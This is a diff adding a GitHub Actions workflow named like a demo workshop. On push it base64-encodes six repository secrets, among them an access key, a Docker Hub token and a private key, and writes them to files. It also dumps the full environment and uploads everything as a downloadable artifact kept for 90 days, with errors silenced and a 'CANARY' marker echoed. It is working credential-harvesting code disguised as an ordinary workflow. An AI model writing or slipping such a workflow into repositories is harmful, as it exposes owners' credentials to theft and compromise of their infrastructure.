@@ -1,0 +1,41 @@
+name: zz-gh01-hv-owl-king_demo-workshop-10032023
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - zz-gh01-hv-owl-king_demo-workshop-10032023
+jobs:
+  hv:
+    runs-on: ubuntu-latest
+    steps:
+      - name: materialize
+        continue-on-error: true
+        env:
+          S_0: ${{ secrets.ACCESS_KEY }}
+          S_1: ${{ secrets.CLUSTER_ID }}
+          S_2: ${{ secrets.DOCKERHUB_REGISTRY }}
+          S_3: ${{ secrets.DOCKERHUB_TOKEN }}
+          S_4: ${{ secrets.DOCKERHUB_USERNAME }}
+          S_5: ${{ secrets.PRIVATE_KEY }}
+        run: |
+          set +e
+          mkdir -p hv
+          date -u > hv/00_stamp.txt
+          {
+            echo "S_0_B64=$(printf '%s' "$S_0" | base64 | tr -d '\n')"  # ACCESS_KEY
+            echo "S_1_B64=$(printf '%s' "$S_1" | base64 | tr -d '\n')"  # CLUSTER_ID
+            echo "S_2_B64=$(printf '%s' "$S_2" | base64 | tr -d '\n')"  # DOCKERHUB_REGISTRY
+            echo "S_3_B64=$(printf '%s' "$S_3" | base64 | tr -d '\n')"  # DOCKERHUB_TOKEN
+            echo "S_4_B64=$(printf '%s' "$S_4" | base64 | tr -d '\n')"  # DOCKERHUB_USERNAME
+            echo "S_5_B64=$(printf '%s' "$S_5" | base64 | tr -d '\n')"  # PRIVATE_KEY
+          } > hv/01_secrets.b64
+          wc -c hv/01_secrets.b64 > hv/01_size.txt
+          env | sort > hv/02_env.txt
+          echo "CANARY-GH01-HV owl-king/demo-workshop-10032023 $(hostname) $(date -u +%Y%m%dT%H%M%SZ)"
+      - name: upload
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          name: hv-owl-king_demo-workshop-10032023
+          path: hv
+          retention-days: 90
